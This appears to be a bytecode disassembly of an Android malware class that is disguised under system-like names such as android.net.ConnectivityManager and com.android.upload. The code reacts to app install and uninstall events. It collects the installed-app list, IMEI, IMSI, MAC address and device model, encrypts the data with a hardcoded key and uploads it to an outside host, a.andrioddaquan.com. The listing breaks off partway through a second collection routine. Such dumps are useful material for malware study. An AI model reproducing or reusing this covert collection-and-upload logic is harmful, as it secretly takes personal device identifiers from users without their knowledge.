_____________________________________________________________________
+ Program class: android/net/ConnectivityManager
  Superclass:    java/lang/Object
        + Methodref [android/content/Intent.getStringExtra (Ljava/lang/String;)Ljava/lang/String;]
      [131] dup
      [132] astore_2 v2
      [133] ifnull +119 (target=252)
      [136] new #77
        + Class [java/lang/StringBuilder]
      [139] dup
      [140] ldc #40
        + String [pkgName=]
      [142] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [145] aload_2 v2
      [146] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [149] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [152] pop
      [153] aload_0 v0
      [154] aload_2 v2
      [155] astore_3 v3
      [156] aconst_null
      [157] astore_1 v1
      [158] invokevirtual #109
        + Methodref [android/content/Context.getPackageManager ()Landroid/content/pm/PackageManager;]
      [161] aload_3 v3
      [162] iconst_0
      [163] invokevirtual #117
        + Methodref [android/content/pm/PackageManager.getPackageInfo (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;]
      [166] getfield #87
        + Fieldref [android/content/pm/PackageInfo.versionName Ljava/lang/String;]
      [169] astore_1 v1
      [170] aload_0 v0
      [171] invokevirtual #153
        + Methodref [com/android/upload/StartService.getPackageManager ()Landroid/content/pm/PackageManager;]
      [174] aload_2 v2
      [175] sipush 8192
      [178] invokevirtual #117
        + Methodref [android/content/pm/PackageManager.getPackageInfo (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;]
      [181] getfield #86
        + Fieldref [android/content/pm/PackageInfo.applicationInfo Landroid/content/pm/ApplicationInfo;]
      [184] aload_0 v0
      [185] invokevirtual #153
        + Methodref [com/android/upload/StartService.getPackageManager ()Landroid/content/pm/PackageManager;]
      [188] invokevirtual #116
        + Methodref [android/content/pm/ApplicationInfo.loadLabel (Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;]
      [191] invokeinterface #174
        + InterfaceMethodref [java/lang/CharSequence.toString ()Ljava/lang/String;]
      [196] astore_3 v3
      [197] aload_0 v0
      [198] getfield #96
        + Fieldref [com/android/upload/StartService.d Lcom/android/a/c;]
      [201] aload_2 v2
      [202] aload_1 v1
      [203] invokevirtual #126
        + Methodref [com/android/a/c.b (Ljava/lang/String;Ljava/lang/String;)Z]
      [206] ifne +44 (target=250)
      [209] new #63
        + Class [com/android/a/a]
      [212] dup
      [213] invokespecial #121
        + Methodref [com/android/a/a.<init> ()V]
      [216] dup
      [217] astore v4
      [219] aload_3 v3
      [220] putfield #90
        + Fieldref [com/android/a/a.b Ljava/lang/String;]
      [223] aload v4
      [225] aload_2 v2
      [226] putfield #91
        + Fieldref [com/android/a/a.c Ljava/lang/String;]
      [229] aload v4
      [231] aload_1 v1
      [232] putfield #92
        + Fieldref [com/android/a/a.d Ljava/lang/String;]
      [235] aload_0 v0
      [236] getfield #96
        + Fieldref [com/android/upload/StartService.d Lcom/android/a/c;]
      [239] aload v4
      [241] invokevirtual #124
        + Methodref [com/android/a/c.a (Lcom/android/a/a;)V]
      [244] goto +6 (target=250)
      [247] invokevirtual #118
        + Methodref [android/content/pm/PackageManager$NameNotFoundException.printStackTrace ()V]
      [250] iconst_1
      [251] ireturn
      [252] aload_1 v1
      [253] ldc #14
        + String [apk_uninstalled]
      [255] invokevirtual #112
        + Methodref [android/content/Intent.getStringExtra (Ljava/lang/String;)Ljava/lang/String;]
      [258] dup
      [259] astore_1 v1
      [260] ifnull +36 (target=296)
      [263] new #77
        + Class [java/lang/StringBuilder]
      [266] dup
      [267] ldc #46
        + String [uninstall pkgName=]
      [269] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [272] aload_1 v1
      [273] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [276] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [279] pop
      [280] aload_0 v0
      [281] getfield #96
        + Fieldref [com/android/upload/StartService.d Lcom/android/a/c;]
      [284] aload_1 v1
      [285] invokestatic #167
        + Methodref [java/lang/System.currentTimeMillis ()J]
      [288] invokestatic #130
        + Methodref [com/android/b/b.a (J)Ljava/lang/String;]
      [291] invokevirtual #125
        + Methodref [com/android/a/c.a (Ljava/lang/String;Ljava/lang/String;)V]
      [294] iconst_1
      [295] ireturn
      [296] aload_0 v0
      [297] invokestatic #131
        + Methodref [com/android/b/b.a (Landroid/content/Context;)I]
      [300] iflt +705 (target=1005)
      [303] aload_0 v0
      [304] dup
      [305] astore_1 v1
      [306] dup
      [307] astore_3 v3
      [308] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [311] ldc #32
        + String [key_upload_app_last_time]
      [313] ldc #2
        + String []
      [315] invokevirtual #145
        + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
      [318] astore_2 v2
      [319] new #77
        + Class [java/lang/StringBuilder]
      [322] dup
      [323] ldc #34
        + String [lastTime=]
      [325] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [328] aload_2 v2
      [329] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [332] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [335] pop
      [336] aload_2 v2
      [337] ldc #2
        + String []
      [339] invokevirtual #161
        + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
      [342] ifne +14 (target=356)
      [345] aload_2 v2
      [346] aconst_null
      [347] astore v4
      [349] iconst_1
      [350] invokestatic #135
        + Methodref [com/android/b/b.a (Ljava/lang/String;I)Z]
      [353] ifeq +27 (target=380)
      [356] aload_3 v3
      [357] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [360] ldc #33
        + String [key_upload_app_success]
      [362] iconst_0
      [363] invokevirtual #146
        + Methodref [com/android/b/g.a (Ljava/lang/String;Z)V]
      [366] aload_3 v3
      [367] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [370] ldc #31
        + String [key_upload_app_count]
      [372] iconst_0
      [373] invokevirtual #143
        + Methodref [com/android/b/g.a (Ljava/lang/String;I)V]
      [376] iconst_1
      [377] goto +33 (target=410)
      [380] aload_3 v3
      [381] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [384] ldc #33
        + String [key_upload_app_success]
      [386] invokevirtual #147
        + Methodref [com/android/b/g.b (Ljava/lang/String;)Z]
      [389] ifne +20 (target=409)
      [392] aload_3 v3
      [393] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [396] ldc #31
        + String [key_upload_app_count]
      [398] invokevirtual #142
        + Methodref [com/android/b/g.a (Ljava/lang/String;)I]
      [401] iconst_5
      [402] ificmpgt +7 (target=409)
      [405] iconst_1
      [406] goto +4 (target=410)
      [409] iconst_0
      [410] ifeq +247 (target=657)
      [413] aload_1 v1
      [414] getfield #97
        + Fieldref [com/android/upload/StartService.e Lcom/android/b/a/c;]
      [417] ifnonnull +240 (target=657)
      [420] new #80
        + Class [java/util/HashMap]
      [423] dup
      [424] invokespecial #169
        + Methodref [java/util/HashMap.<init> ()V]
      [427] astore_3 v3
      [428] new #83
        + Class [org/json/JSONObject]
      [431] dup
      [432] invokespecial #171
        + Methodref [org/json/JSONObject.<init> ()V]
      [435] astore_2 v2
      [436] aload_2 v2
      [437] ldc #15
        + String [app_info]
      [439] aload_1 v1
      [440] getfield #96
        + Fieldref [com/android/upload/StartService.d Lcom/android/a/c;]
      [443] invokevirtual #123
        + Methodref [com/android/a/c.a ()Lorg/json/JSONArray;]
      [446] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [449] pop
      [450] invokestatic #167
        + Methodref [java/lang/System.currentTimeMillis ()J]
      [453] invokestatic #130
        + Methodref [com/android/b/b.a (J)Ljava/lang/String;]
      [456] astore v4
      [458] aload_2 v2
      [459] ldc #26
        + String [install_time]
      [461] aload_1 v1
      [462] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [465] ldc #26
        + String [install_time]
      [467] aload v4
      [469] invokevirtual #145
        + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
      [472] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [475] pop
      [476] aload_2 v2
      [477] ldc #19
        + String [cid]
      [479] aload_1 v1
      [480] ldc #12
        + String [android_data_cid]
      [482] invokestatic #132
        + Methodref [com/android/b/b.a (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;]
      [485] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [488] pop
      [489] aload_2 v2
      [490] ldc #18
        + String [brand]
      [492] getstatic #88
        + Fieldref [android/os/Build.BRAND Ljava/lang/String;]
      [495] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [498] pop
      [499] aload_2 v2
      [500] ldc #36
        + String [model]
      [502] getstatic #89
        + Fieldref [android/os/Build.MODEL Ljava/lang/String;]
      [505] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [508] pop
      [509] aload_2 v2
      [510] ldc #23
        + String [imei]
      [512] aload_1 v1
      [513] getfield #94
        + Fieldref [com/android/upload/StartService.b Landroid/telephony/TelephonyManager;]
      [516] invokestatic #134
        + Methodref [com/android/b/b.a (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
      [519] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [522] pop
      [523] aload_2 v2
      [524] ldc #24
        + String [imsi]
      [526] aload_1 v1
      [527] getfield #94
        + Fieldref [com/android/upload/StartService.b Landroid/telephony/TelephonyManager;]
      [530] invokestatic #137
        + Methodref [com/android/b/b.b (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
      [533] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [536] pop
      [537] aload_2 v2
      [538] ldc #35
        + String [mac]
      [540] aload_1 v1
      [541] getfield #100
        + Fieldref [com/android/upload/StartService.h Landroid/net/wifi/WifiManager;]
      [544] invokestatic #133
        + Methodref [com/android/b/b.a (Landroid/net/wifi/WifiManager;)Ljava/lang/String;]
      [547] invokevirtual #172
        + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
      [550] pop
      [551] goto +9 (target=560)
      [554] aconst_null
      [555] astore v4
      [557] invokevirtual #170
        + Methodref [org/json/JSONException.printStackTrace ()V]
      [560] aload_2 v2
      [561] invokevirtual #173
        + Methodref [org/json/JSONObject.toString ()Ljava/lang/String;]
      [564] astore v4
      [566] new #77
        + Class [java/lang/StringBuilder]
      [569] dup
      [570] ldc #16
        + String [app_info1=]
      [572] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [575] aload v4
      [577] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [580] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [583] pop
      [584] ldc #6
        + String [Top@^囧34]
      [586] aload v4
      [588] invokestatic #150
        + Methodref [com/android/b/j.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
      [591] astore v4
      [593] goto +6 (target=599)
      [596] invokevirtual #168
        + Methodref [java/security/InvalidKeyException.printStackTrace ()V]
      [599] new #77
        + Class [java/lang/StringBuilder]
      [602] dup
      [603] ldc #17
        + String [app_info2=]
      [605] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [608] aload v4
      [610] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [613] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [616] pop
      [617] aload_3 v3
      [618] ldc #5
        + String [InstallInfo]
      [620] aload v4
      [622] invokeinterface #175
        + InterfaceMethodref [java/util/Map.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;]
      [627] pop
      [628] aload_1 v1
      [629] new #65
        + Class [com/android/b/a/c]
      [632] dup
      [633] ldc #22
        + String [http://a.andrioddaquan.com/AppInstallInfo.aspx]
      [635] aload_3 v3
      [636] new #71
        + Class [com/android/upload/a]
      [639] dup
      [640] aload_1 v1
      [641] invokespecial #157
        + Methodref [com/android/upload/a.<init> (Lcom/android/upload/StartService;)V]
      [644] invokespecial #128
        + Methodref [com/android/b/a/c.<init> (Ljava/lang/String;Ljava/util/Map;Lcom/android/b/a/a;)V]
      [647] putfield #97
        + Fieldref [com/android/upload/StartService.e Lcom/android/b/a/c;]
      [650] aload_1 v1
      [651] getfield #97
        + Fieldref [com/android/upload/StartService.e Lcom/android/b/a/c;]
      [654] invokevirtual #129
        + Methodref [com/android/b/a/c.start ()V]
      [657] aload_0 v0
      [658] dup
      [659] astore_1 v1
      [660] ldc #13
        + String [android_traffic_stats]
      [662] invokestatic #136
        + Methodref [com/android/b/b.b (Landroid/content/Context;Ljava/lang/String;)Z]
      [665] ifeq +333 (target=998)
      [668] aload_1 v1
      [669] dup
      [670] astore_2 v2
      [671] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [674] ldc #32
        + String [key_upload_app_last_time]
      [676] ldc #2
        + String []
      [678] invokevirtual #145
        + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
      [681] dup
      [682] astore_3 v3
      [683] ldc #2
        + String []
      [685] invokevirtual #161
        + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
      [688] ifne +14 (target=702)
      [691] aload_3 v3
      [692] aconst_null
      [693] astore v4
      [695] iconst_1
      [696] invokestatic #135
        + Methodref [com/android/b/b.a (Ljava/lang/String;I)Z]
      [699] ifeq +27 (target=726)
      [702] aload_2 v2
      [703] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [706] ldc #33
        + String [key_upload_app_success]
      [708] iconst_0
      [709] invokevirtual #146
        + Methodref [com/android/b/g.a (Ljava/lang/String;Z)V]
      [712] aload_2 v2
      [713] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [716] ldc #31
        + String [key_upload_app_count]
      [718] iconst_0
      [719] invokevirtual #143
        + Methodref [com/android/b/g.a (Ljava/lang/String;I)V]
      [722] iconst_1
      [723] goto +33 (target=756)
      [726] aload_2 v2
      [727] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [730] ldc #33
        + String [key_upload_app_success]
      [732] invokevirtual #147
        + Methodref [com/android/b/g.b (Ljava/lang/String;)Z]
      [735] ifne +20 (target=755)
      [738] aload_2 v2
      [739] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [742] ldc #31
        + String [key_upload_app_count]
      [744] invokevirtual #142
        + Methodref [com/android/b/g.a (Ljava/lang/String;)I]
      [747] iconst_5
      [748] ificmpgt +7 (target=755)
      [751] iconst_1
      [752] goto +4 (target=756)
      [755] iconst_0
      [756] ifeq +242 (target=998)
      [759] aload_1 v1
      [760] getfield #98
        + Fieldref [com/android/upload/StartService.f Lcom/android/b/a/c;]
      [763] ifnonnull +235 (target=998)
      [766] new #80
        + Class [java/util/HashMap]
      [769] dup
      [770] invokespecial #169
        + Methodref [java/util/HashMap.<init> ()V]
      [773] astore_2 v2
      [774] new #83
        + Class [org/json/JSONObject]
